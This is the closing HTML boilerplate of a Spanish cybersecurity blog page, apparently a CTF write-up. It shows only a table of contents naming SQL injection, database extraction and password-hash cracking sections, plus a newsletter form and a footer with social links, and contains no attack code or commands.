</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#inyección-de-código-sql">Inyección de código SQL</a><ul><li><a href="#extracción-de-la-base-de-datos">Extracción de la base de datos</a></li></ul></li><li><a href="#descifrado-de-_hashes_-de-contraseñas">Descifrado de <em>hashes</em> de contraseñas</a></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>